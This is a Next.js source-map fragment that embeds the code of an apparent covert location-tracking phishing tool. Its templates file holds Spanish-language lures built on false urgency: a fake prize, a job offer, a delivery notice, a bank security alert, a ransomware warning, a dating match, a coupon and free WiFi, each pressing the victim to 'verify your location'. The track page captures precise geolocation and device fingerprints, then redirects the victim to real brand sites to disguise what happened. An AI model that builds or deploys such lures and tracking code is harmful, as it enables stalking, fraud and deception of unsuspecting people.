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","debugId":null}},
    {"offset": {"line": 592, "column": 0}, "map": {"version":3,"sources":["file:///project/sandbox/user-workspace/src/config/templates.ts"],"sourcesContent":["export interface Template {\n  title: string\n  subtitle: string\n  message: string\n  buttonText: string\n  bgColor: string\n  icon: string\n  description: string\n  urgencyLevel?: \"high\" | \"medium\" | \"low\"\n  validityPeriod?: string\n}\n\nexport const templates: Record<string, Template> = {\n  premio: {\n    title: \"🎁 ¡Felicitaciones!\",\n    subtitle: \"Has sido seleccionado como ganador\",\n    message: \"Acabas de ganar un iPhone 15 Pro Max en nuestro sorteo mensual. Para coordinar la entrega inmediata, necesitamos verificar tu ubicación. ¡El premio debe ser reclamado en las próximas 2 horas!\",\n    buttonText: \"Reclamar Premio Ahora\",\n    bgColor: \"from-green-900 to-gray-900\",\n    icon: \"🎁\",\n    description: \"Plantilla de premio ganador\",\n    urgencyLevel: \"high\",\n    validityPeriod: \"2 horas\"\n  },\n  empleo: {\n    title: \"💼 Oferta Laboral Urgente\",\n    subtitle: \"Posición Disponible - $5,000 USD/mes\",\n    message: \"Una importante empresa multinacional necesita cubrir una posición de forma inmediata. Tu perfil ha sido preseleccionado. Necesitamos verificar tu ubicación para programar una entrevista urgente para hoy.\",\n    buttonText: \"Confirmar Disponibilidad\",\n    bgColor: \"from-blue-900 to-gray-900\",\n    icon: \"💼\",\n    description: \"Plantilla de oferta laboral\",\n    urgencyLevel: \"high\",\n    validityPeriod: \"24 horas\"\n  },\n  delivery: {\n    title: \"📦 Paquete en Espera\",\n    subtitle: \"Entrega Express Pendiente\",\n    message: \"Tenemos un paquete prioritario para ti que requiere entrega inmediata. El repartidor está en tu zona pero necesita confirmar tu ubicación exacta para la entrega. El paquete volverá a almacén en 30 minutos.\",\n    buttonText: \"Recibir Ahora\",\n    bgColor: \"from-yellow-900 to-gray-900\",\n    icon: \"📦\",\n    description: \"Plantilla de entrega pendiente\",\n    urgencyLevel: \"high\",\n    validityPeriod: \"30 minutos\"\n  },\n  banco: {\n    title: \"🏦 ⚠️ Alerta de Seguridad\",\n    subtitle: \"Verificación Urgente Requerida\",\n    message: \"Detectamos un intento de acceso no autorizado a tu cuenta desde una ubicación desconocida. Verifica tu ubicación actual inmediatamente para prevenir el bloqueo permanente de tu cuenta.\",\n    buttonText: \"Verificar Cuenta\",\n    bgColor: \"from-red-900 to-gray-900\",\n    icon: \"🏦\",\n    description: \"Plantilla de alerta bancaria\",\n    urgencyLevel: \"high\",\n    validityPeriod: \"15 minutos\"\n  },\n  actualizacion: {\n    title: \"⚠️ Actualización Crítica\",\n    subtitle: \"Seguridad Comprometida\",\n    message: \"Tu dispositivo ha sido identificado como vulnerable a un ataque de ransomware. Necesitamos verificar tu ubicación para aplicar un parche de seguridad urgente y proteger tus datos.\",\n    buttonText: \"Proteger Dispositivo\",\n    bgColor: \"from-purple-900 to-gray-900\",\n    icon: \"🔒\",\n    description: \"Plantilla de actualización\",\n    urgencyLevel: \"high\",\n    validityPeriod: \"1 hora\"\n  },\n  social: {\n    title: \"💝 Match Encontrado\",\n    subtitle: \"¡Alguien especial te busca!\",\n    message: \"Una persona muy compatible con tu perfil está cerca de ti ahora mismo y quiere conocerte. Por tu seguridad, necesitamos verificar tu ubicación antes de revelar su identidad.\",\n    buttonText: \"Ver Perfil\",\n    bgColor: \"from-pink-900 to-gray-900\",\n    icon: \"�\",\n    description: \"Plantilla de red social\",\n    urgencyLevel: \"medium\",\n    validityPeriod: \"5 minutos\"\n  },\n  cupon: {\n    title: \"🎫 Descuento VIP\",\n    subtitle: \"Oferta Exclusiva\",\n    message: \"¡Has sido seleccionado! Tienes un cupón de $500 para usar en tiendas cercanas. Verifica tu ubicación para activar el descuento inmediatamente. ¡Solo válido para los próximos 15 minutos!\",\n    buttonText: \"Activar Descuento\",\n    bgColor: \"from-orange-900 to-gray-900\",\n    icon: \"🎫\",\n    description: \"Plantilla de cupón\",\n    urgencyLevel: \"medium\",\n    validityPeriod: \"15 minutos\"\n  },\n  wifi: {\n    title: \"📶 WiFi Gratis 5G\",\n    subtitle: \"Red Premium Disponible\",\n    message: \"Detectamos una red WiFi 5G de alta velocidad cerca de ti. Verifica tu ubicación para conectarte automáticamente y disfrutar de internet ilimitado gratis por 24 horas.\",\n    buttonText: \"Conectar Ahora\",\n    bgColor: \"from-cyan-900 to-gray-900\",\n    icon: \"📶\",\n    description: \"Plantilla de WiFi gratis\",\n    urgencyLevel: \"low\",\n    validityPeriod: \"5 minutos\"\n  }\n}\n\nexport const getTemplate = (type: string): Template => {\n  return templates[type] || templates.premio\n}\n\nexport const getTemplateTypes = (): string[] => {\n  return Object.keys(templates)\n}\n\nexport const getTemplateIcon = (type: string): string => {\n  return templates[type]?.icon || \"🎯\"\n}\n\nexport const getTemplateBgColor = (type: string): string => {\n  return templates[type]?.bgColor || \"from-gray-900 to-black\"\n}\n\nexport const getTemplateUrgencyColor = (level: Template[\"urgencyLevel\"]): string => {\n  switch (level) {\n    case \"high\":\n      return \"text-red-500\"\n    case \"medium\":\n      return \"text-yellow-500\"\n    case \"low\":\n      return \"text-green-500\"\n    default:\n      return \"text-gray-500\"\n  }\n}\n"],"names":[],"mappings":";;;;;;;;AAYO,MAAM,YAAsC;IACjD,QAAQ;QACN,OAAO;QACP,UAAU;QACV,SAAS;QACT,YAAY;QACZ,SAAS;QACT,MAAM;QACN,aAAa;QACb,cAAc;QACd,gBAAgB;IAClB;IACA,QAAQ;QACN,OAAO;QACP,UAAU;QACV,SAAS;QACT,YAAY;QACZ,SAAS;QACT,MAAM;QACN,aAAa;QACb,cAAc;QACd,gBAAgB;IAClB;IACA,UAAU;QACR,OAAO;QACP,UAAU;QACV,SAAS;QACT,YAAY;QACZ,SAAS;QACT,MAAM;QACN,aAAa;QACb,cAAc;QACd,gBAAgB;IAClB;IACA,OAAO;QACL,OAAO;QACP,UAAU;QACV,SAAS;QACT,YAAY;QACZ,SAAS;QACT,MAAM;QACN,aAAa;QACb,cAAc;QACd,gBAAgB;IAClB;IACA,eAAe;QACb,OAAO;QACP,UAAU;QACV,SAAS;QACT,YAAY;QACZ,SAAS;QACT,MAAM;QACN,aAAa;QACb,cAAc;QACd,gBAAgB;IAClB;IACA,QAAQ;QACN,OAAO;QACP,UAAU;QACV,SAAS;QACT,YAAY;QACZ,SAAS;QACT,MAAM;QACN,aAAa;QACb,cAAc;QACd,gBAAgB;IAClB;IACA,OAAO;QACL,OAAO;QACP,UAAU;QACV,SAAS;QACT,YAAY;QACZ,SAAS;QACT,MAAM;QACN,aAAa;QACb,cAAc;QACd,gBAAgB;IAClB;IACA,MAAM;QACJ,OAAO;QACP,UAAU;QACV,SAAS;QACT,YAAY;QACZ,SAAS;QACT,MAAM;QACN,aAAa;QACb,cAAc;QACd,gBAAgB;IAClB;AACF;AAEO,MAAM,cAAc,CAAC;IAC1B,OAAO,SAAS,CAAC,KAAK,IAAI,UAAU,MAAM;AAC5C;AAEO,MAAM,mBAAmB;IAC9B,OAAO,OAAO,IAAI,CAAC;AACrB;AAEO,MAAM,kBAAkB,CAAC;IAC9B,OAAO,SAAS,CAAC,KAAK,EAAE,QAAQ;AAClC;AAEO,MAAM,qBAAqB,CAAC;IACjC,OAAO,SAAS,CAAC,KAAK,EAAE,WAAW;AACrC;AAEO,MAAM,0BAA0B,CAAC;IACtC,OAAQ;QACN,KAAK;YACH,OAAO;QACT,KAAK;YACH,OAAO;QACT,KAAK;YACH,OAAO;QACT;YACE,OAAO;IACX;AACF","debugId":null}},
    {"offset": {"line": 723, "column": 0}, "map": {"version":3,"sources":["file:///project/sandbox/user-workspace/src/app/track/%5BshortCode%5D/page.tsx"],"sourcesContent":["\"use client\"\n\nimport { useEffect, useState } from \"react\"\nimport { Card, CardContent } from \"@/components/ui/card\"\nimport { Button } from \"@/components/ui/button\"\nimport { TrackingService, type TrackingLink } from \"@/lib/services/tracking-service\"\nimport { GeoService } from \"@/lib/services/geo-service\"\nimport { getTemplate } from \"@/config/templates\"\n\ninterface TrackPageProps {\n  params: {\n    shortCode: string\n  }\n}\n\nexport default function TrackPage({ params }: TrackPageProps) {\n  const [link, setLink] = useState<TrackingLink | null>(null)\n  const [error, setError] = useState<string | null>(null)\n  const [isLoading, setIsLoading] = useState(false)\n  const [showMap, setShowMap] = useState(false)\n\n  useEffect(() => {\n    async function loadLink() {\n      try {\n        const links = await TrackingService.getTrackingLinks()\n        const found = links.find(l => l.shortCode === params.shortCode)\n        if (found && found.isActive) {\n          setLink(found)\n        } else {\n          setError(\"Este enlace ha expirado\")\n        }\n      } catch (err) {\n        console.error(\"Error loading tracking link:\", err)\n        setError(\"Error al cargar la página\")\n      }\n    }\n    loadLink()\n  }, [params.shortCode])\n\n  if (error) {\n    return (\n      <div className=\"min-h-screen bg-gradient-to-br from-gray-900 to-black text-white\">\n        <div className=\"container max-w-lg mx-auto p-6\">\n          <Card className=\"bg-black/40 backdrop-blur-sm border-gray-800\">\n            <CardContent className=\"p-6\">\n              <div className=\"text-center text-red-400\">{error}</div>\n            </CardContent>\n          </Card>\n        </div>\n      </div>\n    )\n  }\n\n  if (!link) {\n    return (\n      <div className=\"min-h-screen bg-gradient-to-br from-gray-900 to-black text-white\">\n        <div className=\"container max-w-lg mx-auto p-6\">\n          <Card className=\"bg-black/40 backdrop-blur-sm border-gray-800\">\n            <CardContent className=\"p-6\">\n              <div className=\"flex justify-center\">\n                <div className=\"animate-spin rounded-full h-8 w-8 border-2 border-current\" />\n              </div>\n            </CardContent>\n          </Card>\n        </div>\n      </div>\n    )\n  }\n\n  const template = getTemplate(link.templateType)\n\n  const handleGetLocation = async () => {\n    setIsLoading(true)\n    setError(null)\n\n    try {\n      // Obtener ubicación actual\n      const position = await GeoService.getCurrentPosition({\n        enableHighAccuracy: true,\n        timeout: 10000\n      })\n\n      // Capturar la ubicación\n      await TrackingService.captureLocation(link.id, params.shortCode)\n\n      // Mostrar el mapa simulado\n      setShowMap(true)\n\n      // Redirigir después de un breve retraso\n      setTimeout(() => {\n        // Redirigir según el tipo de plantilla\n        switch (link.templateType) {\n          case \"premio\":\n            window.location.href = \"https://www.amazon.com\"\n            break\n          case \"empleo\":\n            window.location.href = \"https://www.linkedin.com\"\n            break\n          case \"delivery\":\n            window.location.href = \"https://www.fedex.com/tracking\"\n            break\n          case \"banco\":\n            window.location.href = \"https://www.bancopopular.com\"\n            break\n          case \"actualizacion\":\n            window.location.href = \"https://support.microsoft.com\"\n            break\n          case \"social\":\n            window.location.href = \"https://www.facebook.com\"\n            break\n          case \"cupon\":\n            window.location.href = \"https://www.groupon.com\"\n            break\n          case \"wifi\":\n            window.location.href = \"https://www.speedtest.net\"\n            break\n          default:\n            window.location.href = \"https://www.google.com\"\n        }\n      }, 2000)\n\n    } catch (err: any) {\n      console.error(\"Error getting location:\", err)\n      setError(err.message || \"Error al procesar tu solicitud\")\n    } finally {\n      setIsLoading(false)\n    }\n  }\n\n  return (\n    <div className={`min-h-screen bg-gradient-to-br ${template.bgColor} text-white`}>\n      <div className=\"container max-w-lg mx-auto p-6\">\n        <Card className=\"bg-black/40 backdrop-blur-sm border-gray-800\">\n          <CardContent className=\"p-6 space-y-6\">\n            {/* Encabezado */}\n            <div className=\"text-center space-y-4\">\n              <div className=\"text-6xl\">{template.icon}</div>\n              <h1 className=\"text-2xl font-bold\">{template.title}</h1>\n              <p className=\"text-lg text-muted-foreground\">\n                {template.subtitle}\n              </p>\n            </div>\n\n            {/* Mensaje Principal */}\n            <div className=\"text-center py-4\">\n              <p className=\"text-lg\">{template.message}</p>\n            </div>\n\n            {/* Tiempo Restante */}\n            {template.validityPeriod && (\n              <div className=\"text-center text-sm text-yellow-400\">\n                ⏰ Válido por: {template.validityPeriod}\n              </div>\n            )}\n\n            {/* Botón de Acción */}\n            {!showMap && (\n              <Button\n                className={`w-full bg-gradient-to-r ${template.bgColor} hover:opacity-90`}\n                size=\"lg\"\n                onClick={handleGetLocation}\n                disabled={isLoading}\n              >\n                {isLoading ? (\n                  <div className=\"flex items-center gap-2\">\n                    <div className=\"animate-spin rounded-full h-4 w-4 border-2 border-current\" />\n                    <span>Procesando...</span>\n                  </div>\n                ) : (\n                  <>\n                    <span className=\"mr-2\">{template.icon}</span>\n                    {template.buttonText}\n                  </>\n                )}\n              </Button>\n            )}\n\n            {/* Mensaje de Error */}\n            {error && (\n              <div className=\"bg-red-500/10 border border-red-500/50 rounded-lg p-4 text-red-400\">\n                {error}\n              </div>\n            )}\n\n            {/* Mapa Simulado */}\n            {showMap && (\n              <div className=\"space-y-4\">\n                <div className=\"h-[300px] rounded-lg overflow-hidden\">\n                  <div className=\"w-full h-full bg-gray-800 animate-pulse flex items-center justify-center\">\n                    <div className=\"animate-spin rounded-full h-8 w-8 border-2 border-current\" />\n                  </div>\n                </div>\n                <p className=\"text-center text-sm text-green-400\">\n                  ✓ Verificación exitosa. Redirigiendo...\n                </p>\n              </div>\n            )}\n          </CardContent>\n        </Card>\n      </div>\n    </div>\n  )\n}\n"],"names":[],"mappings":"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","debugId":null}}]
}